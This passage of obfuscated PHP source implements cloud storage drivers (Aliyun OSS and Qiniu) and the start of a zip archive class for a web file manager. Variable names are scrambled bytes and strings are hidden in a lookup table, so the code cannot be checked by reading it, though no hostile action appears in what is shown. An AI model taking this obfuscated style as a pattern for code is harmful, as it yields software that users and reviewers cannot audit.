$this->link($»‡Ùó¯İ, $²İ®ÁˆÚ); $this->fileOutLink($êÏ×¥ƒí); } public function fileOutServer($¡ŸÄøã¥, $ÛÒ®Œ÷ = false, $º®§“Æ® = false, $õæĞÏ¢§ = '') { parent::fileOut($¡ŸÄøã¥, $ÛÒ®Œ÷, $º®§“Æ®, $õæĞÏ¢§); } public function fileOutImage($ŠÎòŒ¿Ú, $¢ûÇœø = 250) { $ìĞÑå´Í = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÏÒ Ì„][1348] . $¢ûÇœø); $Å´®ãÀº = $this->link($ŠÎòŒ¿Ú, $ìĞÑå´Í); $this->fileOutLink($Å´®ãÀº); } public function fileOutImageServer($ÌŒ¢Œ™î, $…Å¾ÑÊÆ = 250) { parent::fileOutImage($ÌŒ¢Œ™î, $…Å¾ÑÊÆ); } public function fileOutLink($í¢òÆÀÑ) { $¬€ô»´¸ =& $_SERVER[ÏÒ Ì„]; if (!$this->isCdnHost() && substr($í¢òÆÀÑ, 0, 7) == $¬€ô»´¸[1249]) { $í¢òÆÀÑ = $¬€ô»´¸[1250] . substr($í¢òÆÀÑ, 7); } header($¬€ô»´¸[159] . $í¢òÆÀÑ); die; } public function hashMd5($ÆöÕüà», $Íö£•É  = '') { $Öä–ßÑÕ =& $_SERVER[ÏÒ Ì„]; $™Ç¶ƒ¡± = $this->_objectMeta($ÆöÕüà»); if (!$™Ç¶ƒ¡±) { return $Öä–ßÑÕ[33]; } if (!isset($™Ç¶ƒ¡±[$Öä–ßÑÕ[1325]]) && !empty($Íö£•É )) { $µ«ÀÍ = $this->updateObjMeta($ÆöÕüà», array($Öä–ßÑÕ[1325] => $Íö£•É )); $™Ç¶ƒ¡±[$Öä–ßÑÕ[1325]] = $µ«ÀÍ ? $Íö£•É  : $Öä–ßÑÕ[33]; } return isset($™Ç¶ƒ¡±[$Öä–ßÑÕ[1325]]) ? strtolower($™Ç¶ƒ¡±[$Öä–ßÑÕ[1325]]) : $Öä–ßÑÕ[33]; } public function size($èìš†Í¯) { $ûœáÅ§í = $this->objectMeta($èìš†Í¯); return $ûœáÅ§í ? $ûœáÅ§í[$_SERVER[ÏÒ Ì„][78]] : 0; } public function info($ è£…Û§) { if ($this->isFolder($ è£…Û§)) { return $this->folderInfo($ è£…Û§); } else { if ($this->isFile($ è£…Û§)) { return $this->fileInfo($ è£…Û§); } } return !1; } public function exist($„˜øìš¿) { return $this->isFile($„˜øìš¿) || $this->isFolder($„˜øìš¿); } public function isFile($âëŞ‹) { return !$this->isFolder($âëŞ‹) && $this->objectMeta($âëŞ‹); } public function isFolder($¯ÓŞñŞ) { return $this->cacheMethod($_SERVER[ÏÒ Ì„][199], $¯ÓŞñŞ); } protected function objectMeta($‰Å©¯ı) { return $this->cacheMethod($_SERVER[ÏÒ Ì„][200], $‰Å©¯ı); } protected function _objectMeta($ƒÙºÎßÕ) { $Ô€“åş =& $_SERVER[ÏÒ Ì„]; try { $À§ÛÙÅú = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ƒÙºÎßÕ)); } catch (OSS\Core\OssException $ª»½æœ) { $À§ÛÙÅú = !1; } if ($À§ÛÙÅú) { $À§ÛÙÅú[$Ô€“åş[78]] = intval($À§ÛÙÅú[$Ô€“åş[1323]]); } return $À§ÛÙÅú; } protected function _isFolder($»¹â¸çÆ) { $Û¦Œ ‹† =& $_SERVER[ÏÒ Ì„]; if ($»¹â¸çÆ == $Û¦Œ ‹†[33] || $»¹â¸çÆ == $Û¦Œ ‹†[8]) { return !0; } $ƒËØâª¾ = array($Û¦Œ ‹†[1319] => $Û¦Œ ‹†[8], $Û¦Œ ‹†[1320] => rtrim($»¹â¸çÆ, $Û¦Œ ‹†[8]) . $Û¦Œ ‹†[8], $Û¦Œ ‹†[1321] => 1, $Û¦Œ ‹†[1322] => $Û¦Œ ‹†[33]); $©ñ¶‡© = $this->client->listObjects($this->bucket, $ƒËØâª¾); if ($©ñ¶‡©->getObjectList() || $©ñ¶‡©->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($¤°Ğü£ì) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÏÒ Ì„][1349]; $this->_init($¤°Ğü£ì); } public function _init($ôñé ™) { $Æ”ÏÒŞ– =& $_SERVER[ÏÒ Ì„]; foreach ($ôñé ™ as $‹Ø„µÖ => $ï¼À™’®) { if (isset($this->{$‹Ø„µÖ})) { $this->{$‹Ø„µÖ} = $ï¼À™’®; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Æ”ÏÒŞ–[1350] . LNG($Æ”ÏÒŞ–[1310])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($²‰ñ é–, $Œ¶è¤Ö¢ = '', $³ê±ïÚë = REPEAT_RENAME) { if ($this->setContent($²‰ñ é–, $Œ¶è¤Ö¢)) { return $this->getPathOuter($²‰ñ é–); } return !1; } public function mkdir($ÂÎ¿¦£Ô, $ËşÒâ¾­ = REPEAT_SKIP) { $õÑàëìå =& $_SERVER[ÏÒ Ì„]; $²ŞÒŸ = trim($ÂÎ¿¦£Ô, $õÑàëìå[8]); if ($this->_isFolder($²ŞÒŸ)) { return $this->getPathOuter($²ŞÒŸ); } $ÂÎ¿¦£Ô = $²ŞÒŸ . $õÑàëìå[8]; $í†–äşù = get_path_this($²ŞÒŸ); $êÂ´´‰¾ = $ÂÎ¿¦£Ô . $í†–äşù; if (!$this->mkfile($êÂ´´‰¾)) { return !1; } if (!$this->moveFile($êÂ´´‰¾, $ÂÎ¿¦£Ô)) { $this->delFile($êÂ´´‰¾); return !1; } return $this->getPathOuter($²ŞÒŸ); } public function copyFile($ˆåş‰Ï£, $é­ÉÕÔ†) { $‹„ÉèäŸ = $this->bucketManager->copy($this->bucket, $ˆåş‰Ï£, $this->bucket, $é­ÉÕÔ†, !0); return $‹„ÉèäŸ ? !1 : $this->getPathOuter($é­ÉÕÔ†); } public function moveFile($ÑŞÇßÊû, $˜‰òÁÑ) { $…Ã™ÕÕ = $this->bucketManager->move($this->bucket, $ÑŞÇßÊû, $this->bucket, $˜‰òÁÑ, !0); return $…Ã™ÕÕ ? !1 : $this->getPathOuter($˜‰òÁÑ); } public function delFile($Å‡·œ±) { if (!$this->exist($Å‡·œ±)) { return !0; } $Ö–íÂÇ = $this->bucketManager->delete($this->bucket, $Å‡·œ±); return $Ö–íÂÇ ? !1 : !0; } public function delFolder($ïòè–Çò) { $ÇéôëËö =& $_SERVER[ÏÒ Ì„]; if (!$this->exist($ïòè–Çò)) { return !0; } $this->listItemCache = !1; $ŸêÌ³»¹ = $this->fileList($ïòè–Çò); $this->listItemCache = !0; $Çò“’Àš = trim($ïòè–Çò, $ÇéôëËö[8]) . $ÇéôëËö[8]; if (!empty($ïòè–Çò) && $ïòè–Çò !== $ÇéôëËö[191] && !in_array($Çò“’Àš, $ŸêÌ³»¹[$ÇéôëËö[75]])) { $ŸêÌ³»¹[$ÇéôëËö[75]][] = $Çò“’Àš; } $Õ±¶¢øÂ = $this->delByBatch($ŸêÌ³»¹[$ÇéôëËö[74]]); if (!$Õ±¶¢øÂ) { return !1; } $Õ±¶¢øÂ = $this->delByBatch($ŸêÌ³»¹[$ÇéôëËö[75]]); if (!$Õ±¶¢øÂ) { return !1; } return $this->delFile($Çò“’Àš); } private function delByBatch($óÕªØÊ) { foreach (array_chunk($óÕªØÊ, 1000) as $˜òÒÔ©) { $ãçïûæ» = $this->bucketManager->buildBatchDelete($this->bucket, $˜òÒÔ©); list($ÈÜ…ãÚØ, $Âß‘ÖÇò) = $this->bucketManager->batch($ãçïûæ»); if ($Âß‘ÖÇò) { return !1; } } return !0; } public function rename($õêÛÏƒ, $‹‘ìÃÍü) { return $this->renameObject($õêÛÏƒ, $‹‘ìÃÍü); } public function fileInfo($ğöÕ¥¼È, $“¤ÅÌ‹ = false, $€ş–³ª = array()) { $›ØÍ®µÎ =& $_SERVER[ÏÒ Ì„]; $¾–„£Ñç = array($›ØÍ®µÎ[28] => $this->pathThis($ğöÕ¥¼È), $›ØÍ®µÎ[76] => $this->getPathOuter($›ØÍ®µÎ[8] . $ğöÕ¥¼È), $›ØÍ®µÎ[29] => $›ØÍ®µÎ[193], $›ØÍ®µÎ[78] => isset($€ş–³ª[$›ØÍ®µÎ[1351]]) ? $€ş–³ª[$›ØÍ®µÎ[1351]] : 0, $›ØÍ®µÎ[168] => $this->ext($ğöÕ¥¼È)); if ($“¤ÅÌ‹) { return $¾–„£Ñç; } $¾–„£Ñç[$›ØÍ®µÎ[194]] = $¾–„£Ñç[$›ØÍ®µÎ[84]] = 0; $¾–„£Ñç[$›ØÍ®µÎ[195]] = $¾–„£Ñç[$›ØÍ®µÎ[196]] = !0; if (empty($€ş–³ª)) { $€ş–³ª = $this->objectMeta($ğöÕ¥¼È); if (!$€ş–³ª) { return $¾–„£Ñç; } } if (isset($€ş–³ª[$›ØÍ®µÎ[1352]])) { $¾–„£Ñç[$›ØÍ®µÎ[84]] = substr($€ş–³ª[$›ØÍ®µÎ[1352]] . $›ØÍ®µÎ[33], 0, 10); } if (isset($€ş–³ª[$›ØÍ®µÎ[1351]])) { $¾–„£Ñç[$›ØÍ®µÎ[78]] = $€ş–³ª[$›ØÍ®µÎ[1351]]; } return $¾–„£Ñç; } public function folderInfo($üµÙâİŠ, $éúÇ½€” = false) { $‰îÃÃÓ =& $_SERVER[ÏÒ Ì„]; $ı®¦ÛÖ = array($‰îÃÃÓ[28] => $this->pathThis($üµÙâİŠ), $‰îÃÃÓ[76] => $this->getPathOuter($‰îÃÃÓ[8] . $üµÙâİŠ), $‰îÃÃÓ[29] => $‰îÃÃÓ[77]); if ($éúÇ½€”) { return $ı®¦ÛÖ; } $ı®¦ÛÖ[$‰îÃÃÓ[194]] = $ı®¦ÛÖ[$‰îÃÃÓ[84]] = 0; $ı®¦ÛÖ[$‰îÃÃÓ[195]] = $ı®¦ÛÖ[$‰îÃÃÓ[196]] = !0; $üµÙâİŠ = rtrim($üµÙâİŠ, $‰îÃÃÓ[8]) . $‰îÃÃÓ[8]; $Ï‡¤É³† = $this->objectMeta($üµÙâİŠ); if (isset($Ï‡¤É³†[$‰îÃÃÓ[1352]])) { $ı®¦ÛÖ[$‰îÃÃÓ[84]] = substr($Ï‡¤É³†[$‰îÃÃÓ[1352]] . $‰îÃÃÓ[33], 0, 10); } return $ı®¦ÛÖ; } public function listPath($¬şƒ×ÜÎ, $Ş²‰…£ = false) { $œ•ì“ï› =& $_SERVER[ÏÒ Ì„]; $Ø¼ã‡Îğ = $this->fileList($¬şƒ×ÜÎ, $œ•ì“ï›[8], !0); foreach ($Ø¼ã‡Îğ[$œ•ì“ï›[75]] as $š»¦ÃŞş => $··±³İñ) { $Ø¼ã‡Îğ[$œ•ì“ï›[75]][$š»¦ÃŞş] = $this->folderInfo($··±³İñ, $Ş²‰…£); } foreach ($Ø¼ã‡Îğ[$œ•ì“ï›[74]] as $š»¦ÃŞş => $··±³İñ) { $Ø¼ã‡Îğ[$œ•ì“ï›[74]][$š»¦ÃŞş] = $this->fileInfo($··±³İñ[$œ•ì“ï›[93]], $Ş²‰…£, $··±³İñ); } return $Ø¼ã‡Îğ; } public function has($â÷ªó, $µğè°± = false, $àş³á¼½ = true) { $ü«¡½ÈÀ =& $_SERVER[ÏÒ Ì„]; $â÷ªó = trim($â÷ªó, $ü«¡½ÈÀ[8]); $şŒğ«¼÷ = empty($â÷ªó) && $â÷ªó !== $ü«¡½ÈÀ[191] ? $ü«¡½ÈÀ[33] : $â÷ªó . $ü«¡½ÈÀ[8]; $ñÊµ–¸ = $ü«¡½ÈÀ[33]; $âÂÖ‚˜ğ = 500; $¸ØßÕŸ– = $ü«¡½ÈÀ[8]; $£÷ñÖº‘ = $¤ö—¬ì = 0; while (!0) { check_abort(); list($æÎ’÷¨ , $û €Ò‘) = $this->bucketManager->listFiles($this->bucket, $şŒğ«¼÷, $ñÊµ–¸, $âÂÖ‚˜ğ, $¸ØßÕŸ–); if ($û €Ò‘) { break; } $ñÊµ–¸ = array_key_exists($ü«¡½ÈÀ[1322], $æÎ’÷¨ ) ? $ñÊµ–¸ = $æÎ’÷¨ [$ü«¡½ÈÀ[1353]] : $ü«¡½ÈÀ[33]; if ($µğè°±) { if (!empty($æÎ’÷¨ [$ü«¡½ÈÀ[1354]])) { $£÷ñÖº‘ += count($æÎ’÷¨ [$ü«¡½ÈÀ[1354]]); } if (!empty($æÎ’÷¨ [$ü«¡½ÈÀ[1355]])) { $¤ö—¬ì += count($æÎ’÷¨ [$ü«¡½ÈÀ[1355]]); } if ($ñÊµ–¸ === $ü«¡½ÈÀ[33]) { break; } continue; } if ($àş³á¼½) { if (!empty($æÎ’÷¨ [$ü«¡½ÈÀ[1354]])) { return !0; } } else { if (!empty($æÎ’÷¨ [$ü«¡½ÈÀ[1355]])) { return !0; } } if ($ñÊµ–¸ === $ü«¡½ÈÀ[33]) { break; } } if ($µğè°±) { return array($ü«¡½ÈÀ[203] => $£÷ñÖº‘, $ü«¡½ÈÀ[204] => $¤ö—¬ì); } return !1; } public function listAll($¢çÅ¦ìÃ) { $ıŸ„¿›î =& $_SERVER[ÏÒ Ì„]; $”ªÌÚ¹° = $this->fileList($¢çÅ¦ìÃ, $ıŸ„¿›î[33], !0); $ƒ®Öß¼ = array(); foreach ($”ªÌÚ¹°[$ıŸ„¿›î[74]] as $ ëÌØ ×) { $ƒ®Öß¼[$ ëÌØ ×[$ıŸ„¿›î[93]]] = $ ëÌØ ×[$ıŸ„¿›î[78]]; } foreach ($”ªÌÚ¹°[$ıŸ„¿›î[75]] as $ ëÌØ ×) { if (is_string($ ëÌØ ×)) { $ƒ®Öß¼[$ ëÌØ ×] = 0; } } return $this->listAllFiles($¢çÅ¦ìÃ, array_keys($ƒ®Öß¼), $ƒ®Öß¼); } private function fileList($ìõ½–ë, $³ÛÙöóá = '', $àñàºî = 0) { $·ÌŸÈ± =& $_SERVER[ÏÒ Ì„]; $ìõ½–ë = trim($ìõ½–ë, $·ÌŸÈ±[8]); $¦ıöí“ = empty($ìõ½–ë) && $ìõ½–ë !== $·ÌŸÈ±[191] ? $·ÌŸÈ±[33] : $ìõ½–ë . $·ÌŸÈ±[8]; $Ä¡¹ûª„ = $·ÌŸÈ±[33]; $½Ù–í’® = 1000; $ë°ĞÛÀ = $this->listItemCache === !1 ? !1 : !0; $ç‚Ê«Ñş = $òÚù˜Ö = array(); while (!0) { check_abort(); list($‡Ãüë³£, $ŒâíÀÛ¬) = $this->bucketManager->listFiles($this->bucket, $¦ıöí“, $Ä¡¹ûª„, $½Ù–í’®, $³ÛÙöóá); if ($ŒâíÀÛ¬) { break; } $Ä¡¹ûª„ = array_key_exists($·ÌŸÈ±[1322], $‡Ãüë³£) ? $Ä¡¹ûª„ = $‡Ãüë³£[$·ÌŸÈ±[1353]] : $·ÌŸÈ±[33]; $ÔÛÙÌÖµ = isset($‡Ãüë³£[$·ÌŸÈ±[1354]]) ? $‡Ãüë³£[$·ÌŸÈ±[1354]] : array(); $€£Ã‡²Ó = isset($‡Ãüë³£[$·ÌŸÈ±[1355]]) ? $‡Ãüë³£[$·ÌŸÈ±[1355]] : array(); foreach ($ÔÛÙÌÖµ as $³²Ÿâ») { if ($³²Ÿâ»[$·ÌŸÈ±[93]] == $¦ıöí“) { continue; } $¬ß¨ÖüË = $³²Ÿâ»[$·ÌŸÈ±[93]]; $æÔÜ·é§ = $³²Ÿâ»[$·ÌŸÈ±[1351]]; $³²Ÿâ»[$·ÌŸÈ±[78]] = $æÔÜ·é§; $Üé†‹šµ = $æÔÜ·é§ == 0 && substr($¬ß¨ÖüË, strlen($¬ß¨ÖüË) - 1, 1) == $·ÌŸÈ±[8] ? !0 : !1; if ($ë°ĞÛÀ) { $this->cacheMethod($·ÌŸÈ±[199], $¬ß¨ÖüË, $Üé†‹šµ); $this->cacheMethod($·ÌŸÈ±[200], $¬ß¨ÖüË, $³²Ÿâ»); } if ($Üé†‹šµ) { $ç‚Ê«Ñş[] = $¬ß¨ÖüË; continue; } $òÚù˜Ö[] = $àñàºî ? $³²Ÿâ» : $¬ß¨ÖüË; } foreach ($€£Ã‡²Ó as $¬ß¨ÖüË) { if ($¬ß¨ÖüË == $¦ıöí“) { continue; } $ç‚Ê«Ñş[] = $¬ß¨ÖüË; if ($ë°ĞÛÀ) { $this->cacheMethod($·ÌŸÈ±[199], $¬ß¨ÖüË, !0); } } if ($Ä¡¹ûª„ === $·ÌŸÈ±[33]) { break; } } if ($ë°ĞÛÀ) { $this->cacheMethod($·ÌŸÈ±[199], $ìõ½–ë, !0); } return array($·ÌŸÈ±[75] => $ç‚Ê«Ñş, $·ÌŸÈ±[74] => $òÚù˜Ö); } public function canRead($ÀÛäŸ›) { return $this->exist($ÀÛäŸ›) ? !0 : !1; } public function canWrite($œ·Ò é) { return $this->exist($œ·Ò é) ? !0 : !1; } public function getContent($­¤ÂËš­) { return $this->fileSubstr($­¤ÂËš­, 0, -1); } public function setContent($Ÿ°Ëë©¼, $Øñë´À = '') { $»ÀÁïü = $this->tempFile($this->pathThis($Ÿ°Ëë©¼)); file_put_contents($»ÀÁïü, $Øñë´À); if ($this->upload($Ÿ°Ëë©¼, $»ÀÁïü)) { $this->tempFileRemve($»ÀÁïü); return !0; } return !1; } public function refreshUrls($ÒÔíåï) { $ÊìÎ¦Œß =& $_SERVER[ÏÒ Ì„]; $¥àÄ©çÙ = array(); if (is_array($ÒÔíåï)) { foreach ($ÒÔíåï as $×àù¢ìË) { $¥àÄ©çÙ[] = $this->link($×àù¢ìË); } } else { $¥àÄ©çÙ[] = $this->link($ÒÔíåï); } $´„ÇÜû = new Qiniu\Cdn\CdnManager($this->auth); list($º ĞÍ‡Ù, $éãÎ’„) = $´„ÇÜû->refreshUrls($¥àÄ©çÙ); if ($éãÎ’„) { return !1; } return $º ĞÍ‡Ù[$ÊìÎ¦Œß[1111]] == $ÊìÎ¦Œß[750] ? !0 : !1; } public function fileSubstr($ì¨¢ûë°, $Ë¢»Èı¡, $Ü±Ú³á) { $êûÆõ­’ =& $_SERVER[ÏÒ Ì„]; if (!($“ø¦á™Î = $this->link($ì¨¢ûë°))) { return !1; } $Ê…ãıİ = !1; if ($Ü±Ú³á > 0) { $¿ø¤¦ı÷ = $Ë¢»Èı¡ + $Ü±Ú³á - 1; $Ê…ãıİ = array($êûÆõ­’[1356] . $Ë¢»Èı¡ . $êûÆõ­’[454] . $¿ø¤¦ı÷); } $¥å¾½ã = url_request($“ø¦á™Î, $êûÆõ­’[228], !1, $Ê…ãıİ); return $¥å¾½ã[$êûÆõ­’[740]] ? $¥å¾½ã[$êûÆõ­’[1121]] : !1; } public function upload($ğ£ıøÀ, $ğŠ›†Ò, $Óğº€‰ = false, $½¯ç­ãâ = REPEAT_REPLACE) { $Ù´Ùü = new Qiniu\Storage\UploadManager(); $íÁÙÉğ± = $this->auth->uploadToken($this->bucket, $ğ£ıøÀ); $†Ï§”üç = get_file_mime(get_path_ext($ğŠ›†Ò)); list($ç¡¶œ€î, $‹¾—Ó¶») = $Ù´Ùü->putFile($íÁÙÉğ±, $ğ£ıøÀ, $ğŠ›†Ò, null, $†Ï§”üç); return $‹¾—Ó¶» ? !1 : $this->getPathOuter($ğ£ıøÀ); } public function uploadFormData($á§§ÙÉ‘, $Õêå„æÓ = 3600) { return $this->uploadToken($á§§ÙÉ‘, $Õêå„æÓ); } public function multiUploadFormData($àú¾ˆ‚Ş, $¦£æÚ½ò = 3600) { return $this->uploadToken($àú¾ˆ‚Ş, $¦£æÚ½ò); } private function uploadToken($ÏèâòŞ, $˜Óı±õÊ = 3600) { $×«ÏĞ°À =& $_SERVER[ÏÒ Ì„]; $²¾ ÄùÇ = $˜Óı±õÊ; $¦¨æÃ = array($×«ÏĞ°À[1357] => $×«ÏĞ°À[1358]); $ª®ó°¥ğ = $ÏèâòŞ; $Ëö¯ñÚÛ = $this->auth->uploadToken($this->bucket, $ª®ó°¥ğ, $²¾ ÄùÇ, $¦¨æÃ, !0); $©Ô­• = empty($this->region) || $this->region == $×«ÏĞ°À[1359] ? $×«ÏĞ°À[33] : $×«ÏĞ°À[454] . $this->region; $§®ƒıı = http_type() . "\x3a\57\x2f\x75\x70\x6c\157\141\144{$©Ô­•}\x2e\x71\x69\156\151\165\x70\56\x63\157\155\57"; return array($×«ÏĞ°À[1360] => $Ëö¯ñÚÛ, $×«ÏĞ°À[1361] => $§®ƒıı); } public function download($¡¤ÌÕÙ¸, $ı˜‚Ì¿Ô) { $Ü©ÎÌ™Ñ = IO::getPathInner(IO::mkfile($ı˜‚Ì¿Ô)); if (!($Å’ğ›Ë‘ = $this->link($¡¤ÌÕÙ¸))) { return !1; } $¸Î •—Ä = 0; $Á¾Óßòß = 1024 * 200; $œÖî¬¶Ğ = fopen($Ü©ÎÌ™Ñ, $_SERVER[ÏÒ Ì„][1362]); while (!0) { $ËÍ“¨Ñ¥ = $this->fileSubstr($¡¤ÌÕÙ¸, $¸Î •—Ä, $Á¾Óßòß); if ($ËÍ“¨Ñ¥ === !1) { return !1; } fwrite($œÖî¬¶Ğ, $ËÍ“¨Ñ¥); $¸Î •—Ä += $Á¾Óßòß; if (strlen($ËÍ“¨Ñ¥) < $Á¾Óßòß) { break; } } fclose($œÖî¬¶Ğ); return $ı˜‚Ì¿Ô; } public function link($óŸ¹îãè, $Ùœà¯‰Ô = '') { if (!$this->isFile($óŸ¹îãè)) { return !1; } $¶ìãıì = $this->getHost() . $_SERVER[ÏÒ Ì„][8] . $this->pathEncode($óŸ¹îãè) . $Ùœà¯‰Ô; return $this->auth->privateDownloadUrl($¶ìãıì, 3600 * 12); } public function fileOut($ö…‰ÌÓÒ, $€Ö¦Ô·– = false, $ºïİë•¬ = false, $š àùŒÌ = '') { $â²½Æ–ğ =& $_SERVER[ÏÒ Ì„]; if ($this->isFileOutServer()) { return $this->fileOutServer($ö…‰ÌÓÒ, $€Ö¦Ô·–, $ºïİë•¬, $š àùŒÌ); } if (!$ºïİë•¬) { $ºïİë•¬ = $this->pathThis($ö…‰ÌÓÒ); } $£ŸÅá§³ = $€Ö¦Ô·– ? $â²½Æ–ğ[1363] . rawurlencode($ºïİë•¬) : $â²½Æ–ğ[33]; $›¡ùœÏ = $this->link($ö…‰ÌÓÒ, $£ŸÅá§³); $this->fileOutLink($›¡ùœÏ); } public function fileOutServer($ËœŸù¸, $‘¦Ä şÖ = false, $é¢Œ‹Æ = false, $âÆøã©Á = '') { parent::fileOut($ËœŸù¸, $‘¦Ä şÖ, $é¢Œ‹Æ, $âÆøã©Á); } public function fileOutImage($¤ä†Ñù‹, $Îò§Ü± = 250) { $¹ùº¾  = $this->link($¤ä†Ñù‹, $_SERVER[ÏÒ Ì„][1364] . $Îò§Ü±); $this->fileOutLink($¹ùº¾ ); } public function fileOutImageServer($Ó­ˆÉ†Ô, $ÛÜšÜ˜ = 250) { parent::fileOutImage($Ó­ˆÉ†Ô, $ÛÜšÜ˜); } public function hashMd5($”úÑş®) { $ÔâªãÉŒ =& $_SERVER[ÏÒ Ì„]; $¸¢Ûù­ = $this->objectMeta($”úÑş®); return isset($¸¢Ûù­[$ÔâªãÉŒ[208]]) ? $¸¢Ûù­[$ÔâªãÉŒ[208]] : !1; $”ÓÛÌà = $this->link($”úÑş®, $ÔâªãÉŒ[1365]); } public function size($ß¶…Í¬) { $ÊßÊ‚µ¸ = $this->objectMeta($ß¶…Í¬); return $ÊßÊ‚µ¸ ? $ÊßÊ‚µ¸[$_SERVER[ÏÒ Ì„][78]] : 0; } public function info($ÑŸö¦Ä) { if ($this->isFolder($ÑŸö¦Ä)) { return $this->folderInfo($ÑŸö¦Ä); } else { if ($this->isFile($ÑŸö¦Ä)) { return $this->fileInfo($ÑŸö¦Ä); } } return !1; } public function exist($½ƒ­ÌÕ) { return $this->isFile($½ƒ­ÌÕ) || $this->isFolder($½ƒ­ÌÕ); } public function isFile($¼‚Ô¼è„) { return !$this->isFolder($¼‚Ô¼è„) && $this->objectMeta($¼‚Ô¼è„); } public function isFolder($ä±•´ĞÆ) { return $this->cacheMethod($_SERVER[ÏÒ Ì„][199], $ä±•´ĞÆ); } protected function objectMeta($°ò“ôƒŒ) { return $this->cacheMethod($_SERVER[ÏÒ Ì„][200], $°ò“ôƒŒ); } protected function _objectMeta($£Ããäºã) { $âçÂ€ƒó =& $_SERVER[ÏÒ Ì„]; list($ø˜Ê °, $¹§Ç¹ó) = $this->bucketManager->stat($this->bucket, $£Ããäºã); if ($ø˜Ê °) { $ø˜Ê °[$âçÂ€ƒó[78]] = intval($ø˜Ê °[$âçÂ€ƒó[1351]]); } return $ø˜Ê °; } protected function _isFolder($ÒŠÔ¨Ş×) { $¼•¡‚ªÄ =& $_SERVER[ÏÒ Ì„]; if ($ÒŠÔ¨Ş× == $¼•¡‚ªÄ[33] || $ÒŠÔ¨Ş× == $¼•¡‚ªÄ[8]) { return !0; } list($ó°ÑØ‚Å, $©±°¤Âß) = $this->bucketManager->listFiles($this->bucket, trim($ÒŠÔ¨Ş×, $¼•¡‚ªÄ[8]) . $¼•¡‚ªÄ[8], $¼•¡‚ªÄ[33], 1, $¼•¡‚ªÄ[8]); return !empty($ó°ÑØ‚Å[$¼•¡‚ªÄ[1354]]) || !empty($ó°ÑØ‚Å[$¼•¡‚ªÄ[1355]]) ? !0 : !1; } } goto AŠÖÙù–òå; E Ş¸ö¼³Â: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $åÌóçî; if (!$åÌóçî) { $Ò¹Î©üú = IO::init($_SERVER[ÏÒ Ì„][8]); } return $Ò¹Î©üú; } private static function iconvSystem($çË˜á¦‡) { return self::local()->iconvSystem($çË˜á¦‡); } private static function iconvApp($Òı±™·ğ) { return self::local()->iconvApp($Òı±™·ğ); } public static function zip($¼å¨úğ·, $Ç››™  = "\x7a\151\x70", $‘³…­æµ = '', $äÜÅ´áŸ = REPEAT_RENAME) { $……¢èÎ· =& $_SERVER[ÏÒ Ì„]; $ÖÒê î = self::init($¼å¨úğ·[0][$……¢èÎ·[76]]); $Íé×ïí‚ = self::info($¼å¨úğ·[0][$……¢èÎ·[76]]); $òâíŒƒ• = !1; if (!$‘³…­æµ && $ÖÒê î->getType() == $……¢èÎ·[106]) { $öÍÍ‡ = self::zipFileList($¼å¨úğ·); } else { $òâíŒƒ• = $‘³…­æµ ? $‘³…­æµ : TEMP_FILES . $……¢èÎ·[1112] . time() . rand_string(8) . $……¢èÎ·[8]; mk_dir($òâíŒƒ•); $öÍÍ‡ = self::zipFileList($¼å¨úğ·, $òâíŒƒ•); } $ÜßéŞá = $Íé×ïí‚[$……¢èÎ·[28]]; if (count($öÍÍ‡) > 1) { $ ‘›ÔÔÏ = IO::info(IO::pathFather($Íé×ïí‚[$……¢èÎ·[76]])); $ÜßéŞá = $ ‘›ÔÔÏ[$……¢èÎ·[28]]; } $éÃ­§¹Ù = $òâíŒƒ•; if (!$éÃ­§¹Ù) { $éÃ­§¹Ù = get_path_father($Íé×ïí‚[$……¢èÎ·[76]]); if (!$‘³…­æµ && $ÖÒê î->getType() == $……¢èÎ·[106]) { $éÃ­§¹Ù = get_path_father($ÖÒê î->path); } $ÖÑ¸—œú = IO::info($éÃ­§¹Ù); if (!$ÖÑ¸—œú[$……¢èÎ·[196]]) { show_json(LNG($……¢èÎ·[1113]), !1); } } $ü£ùşĞô = $éÃ­§¹Ù . $ÜßéŞá . $……¢èÎ·[95] . $Ç››™ ; $ü£ùşĞô = get_filename_auto($ü£ùşĞô, $……¢èÎ·[33], $äÜÅ´áŸ); $Ÿƒş÷¡ = self::iconvSystem($ü£ùşĞô); foreach ($öÍÍ‡ as $¼º€Š» => $àšÍó÷Ø) { $öÍÍ‡[$¼º€Š»] = self::iconvSystem($àšÍó÷Ø); } KodArchive::create($Ÿƒş÷¡, $öÍÍ‡); if (!IO::exist($ü£ùşĞô)) { if ($òâíŒƒ•) { del_dir($òâíŒƒ•); } show_json(LNG($……¢èÎ·[1114]), !1); } if ($‘³…­æµ || !$òâíŒƒ•) { if ($òâíŒƒ• && strstr($òâíŒƒ•, TEMP_FILES)) { $ÉÑ¸ªüÁ = $öÍÍ‡ = array(); recursion_dir($éÃ­§¹Ù, $ÉÑ¸ªüÁ, $öÍÍ‡, 0); foreach ($ÉÑ¸ªüÁ as $‚êŸÇ€) { del_dir($‚êŸÇ€); } foreach ($öÍÍ‡ as $íûÇÆ½) { if ($íûÇÆ½ == $Ÿƒş÷¡) { continue; } del_file($íûÇÆ½); } } return $ü£ùşĞô; } $Ÿ¤Ş¡ = self::pathFather($Íé×ïí‚[$……¢èÎ·[76]]); $å‹š‹ù˜ = self::move($ü£ùşĞô, $Ÿ¤Ş¡, $äÜÅ´áŸ); if (!$å‹š‹ù˜) { del_dir($òâíŒƒ•); show_json(LNG($……¢èÎ·[1114]), !1); } del_dir($òâíŒƒ•); return $å‹š‹ù˜; } public static function unzip($›öôĞ²”, $ü®öí¬ñ = "\162\145\160\x6c\x61\x63\145") { $ó‡‚Î Ë =& $_SERVER[ÏÒ Ì„]; $„øëô‹ = $›öôĞ²”[$ó‡‚Î Ë[76]]; $»Í¼ï½ï 